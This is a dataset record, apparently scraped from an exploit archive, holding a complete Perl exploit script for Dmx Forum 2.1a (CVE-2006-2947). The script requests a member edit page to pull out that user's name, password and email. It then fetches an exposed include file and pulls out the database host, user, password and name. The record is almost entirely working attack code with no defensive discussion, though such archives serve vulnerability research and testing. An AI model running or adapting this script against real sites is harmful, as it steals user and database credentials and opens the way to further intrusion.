{
  "id": "1882",
  "title": "Dmx Forum 2.1a - &#039;edit.php&#039; Remote Password Disclosure",
  "cve": "CVE-2006-2947",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# by DarkFig -- www.acid-root.new.fr\r\n#\r\nuse LWP::Simple;\r\n\r\nif ( !$ARGV[1] ) {\r\nheader();\r\nprint \"\\n| Usage: <url> <member_id> ----------------|\";\r\nprint \"\\n+------------------------------------------+\";\r\nprint \"\\n| Example: http://localhost/dmx/ 1   ------|\";\r\nend();\r\n}\r\n\r\nsub header {\r\nprint \"\\n+------------------------------------------+\";\r\nprint \"\\n| Dmx Forum <= v2.1a SQL Injection Exploit |\";\r\nprint \"\\n+------------------------------------------+\";\r\n}\r\n\r\nsub end {\r\nprint \"\\n+------------------------------------------+\\n\";\r\nexit;\r\n}\r\n\r\n$err0 = \"\\n[-]Can't connect to the host !\";\r\n\r\nheader();\r\n$url = \"$ARGV[0]\".\"pops/edit.php?membre=\".\"$ARGV[1]\";\r\n$req = get($url) or print \"$err0\";\r\n\r\nif( $req =~ /input name=\"pseudo\" type=\"text\" id=\"pseudo\" value=\"(.*?)\"/ ){\r\nprint \"\\n [+]Username: $1\";\r\n$req =~ /input name=\"pwd\" type=\"password\" id=\"pwd\" value=\"(.*?)\"/ , print \"\\n [+]Password: $1\";\r\n$req =~ /input name=\"email\" type=\"text\" id=\"email\" value=\"(.*?)\"/ , print \"\\n [+]Email: $1\";} else {print \"\\n[-]Part 1 failed !\";}\r\n\r\n\r\n$url2 = \"$ARGV[0]\".\"_includes/bd.inc\";\r\n$req2 = get($url2) or print \"$err0\";\r\nif($req2 =~ /host = \"(.*?)\";/)\r\n{print \"\\n[+]DBHOST: $1\";\r\n$req2 =~ /user = \"(.*?)\";/;print \"\\n[+]DBUSER: $1\";\r\n$req2 =~ /pass = \"(.*?)\";/;print \"\\n[+]DBPASS: $1\";\r\n$req2 =~ /bdd = \"(.*?)\";/;print \"\\n[+]DBNAME: $1\";\r\n} else {print \"\\n[-]Part 2 failed !\";}\r\n\r\nend();\r\n\r\n# milw0rm.com [2006-06-05]",
  "url": "https://www.exploit-db.com/exploits/1882"
}